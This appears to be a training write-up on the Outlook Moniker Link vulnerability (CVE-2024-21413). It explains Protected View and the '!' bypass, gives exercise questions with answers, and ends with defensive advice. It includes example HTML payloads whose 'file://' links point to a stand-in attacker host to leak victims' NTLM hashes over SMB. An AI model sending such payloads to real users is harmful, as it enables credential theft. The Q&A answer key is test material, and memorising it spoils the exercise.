# Task 2 - Moniker Link (CVE-2024-21413)

## Learning Objectives
- Understand Outlook's HTML email rendering capabilities
- Learn Moniker Link functionality and security implications
- Master Outlook Protected View security mechanisms
- Understand the vulnerability bypass technique
- Practice identifying Moniker Link types and bypass characters

## Overview
Moniker Links represent a powerful but potentially dangerous feature in Microsoft Outlook that allows emails to trigger external applications. Understanding how these links work and how they can be exploited is crucial for both security professionals and end users who need to recognize potential threats.

### Outlook Email Capabilities

**HTML Email Rendering**
- Outlook can render **emails as HTML**
- Enables rich formatting and interactive content
- Supports various HTML elements and attributes
- Provides enhanced user experience

**Hyperlink Parsing**
- Outlook can **parse hyperlinks** (HTTP and HTTPS)
- Automatically detects and formats clickable links
- Supports various URL schemes and protocols
- Enables direct navigation from email content

**Moniker Link Support**
- Outlook can open URLs **specifying applications** known as **Moniker Links**
- Allows emails to trigger external applications
- Outlook prompts security warning when external applications are triggered
- Provides integration with system applications

### Outlook Protected View

**Security Mechanism**
- Opens emails containing attachments, hyperlinks, and similar content in read-only mode
- Blocks potentially dangerous content such as **macros**
- Prevents automatic execution of malicious code
- Provides additional security layer for email content

**Protected View Features**
- Read-only email display
- Blocked macro execution
- Restricted hyperlink functionality
- Security warnings for external applications

### Moniker Link Exploitation

**File Protocol Moniker Links**
- Use `file://` Moniker link in hyperlinks
- Instructs Outlook to attempt accessing files on network shares
- Example: `<a href="file://ATTACKER_IP/test>Click me</a>`
- **SMB protocol** used for network file access

**Authentication Process**
- SMB protocol involves local credentials for authentication
- Outlook attempts to authenticate with remote file share
- Uses Windows NTLM authentication mechanism
- Credentials sent to remote system

**Protected View Blocking**
- Outlook Protected View catches and blocks file access attempts
- Prevents unauthorized network access
- Shows security warnings to users
- Blocks potential credential leakage

### Vulnerability Exploitation

**The Vulnerability**
- Modify hyperlink to include `! + some text`
- Results in bypassing Outlook's Protected View
- Example: `<a href="file://ATTACKER_MACHINE/test!exploit">Click me</a>`
- Special character `!` triggers bypass mechanism

**Bypass Mechanism**
- `!` character modifies Moniker Link behavior
- Circumvents Protected View security checks
- Allows file access attempts to proceed
- Enables credential leakage attacks

**Important Notes**
- Shared file does NOT need to exist on remote device
- Authentication attempt happens regardless of file existence
- Results in victim's Windows NTLM hash being sent to attacker
- Attack succeeds even without valid file share

### Practical Examples

**Exercise Questions**

**Question 1**: What Moniker Link type do we use in the hyperlink?
- **Answer**: `file://`

**Question 2**: What is the special character used to bypass Outlook's "protected view"?
- **Answer**: `!`

### Security Implications

**Attack Vectors**
- Email-based credential harvesting
- NTLM hash capture and cracking
- Lateral movement in network environments
- Privilege escalation opportunities

**Defense Strategies**
- Email security filtering
- Network monitoring for SMB traffic
- User security awareness training
- Regular security updates and patches

## Best Practices
- Be cautious with hyperlinks in emails from unknown sources
- Implement email security solutions that detect Moniker Links
- Monitor network traffic for unusual SMB authentication attempts
- Keep Outlook and Windows systems updated with latest patches
- Train users to recognize suspicious email content